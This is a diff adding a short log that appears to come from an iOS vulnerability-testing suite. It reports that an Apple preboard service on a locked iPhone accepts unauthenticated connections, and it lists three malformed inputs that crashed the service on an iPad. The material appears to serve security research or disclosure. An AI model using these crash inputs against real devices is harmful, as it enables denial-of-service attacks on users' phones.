@@ -1,0 +1,24 @@
+Runtime Verification Log -- Finding #23
+Generated: 2026-04-18T13:08:36Z
+Tool: scripts/exploit_tests/tools/run_all_findings.py
+Device: iPhone16,1 iOS 26.3 (23D127)
+UDID: 00008130-000C219A0206001C
+
+Test: test_23_preboard
+Result: CONFIRMED
+Evidence: preboardservice_v2 reachable on locked device; response={'Error': True, 'Version': 2}
+
+Service: com.apple.preboardservice_v2
+  - Connection: ACCEPTED without pairing or authentication
+  - Empty dict manifest response: {'Error': True, 'Version': 2}
+  - Service alive after empty-dict probe: YES
+
+Crash inputs (from prior testing, 2026-04-05, iPad8,10):
+  - {ManifestVersion: 1}             --> Connection lost (crash)
+  - {StashKey: x, ManifestVersion: 1} --> Broken pipe (crash)
+  - 64 zero bytes (raw)              --> Broken pipe (crash)
+
+Note: crash confirmation was on iPad8,10 (iPadOS 26.3). The 2026-04-18
+      run_all_findings.py test confirmed service accessibility only on
+      iPhone16,1. Crash behavior expected identical across devices on
+      same OS version.
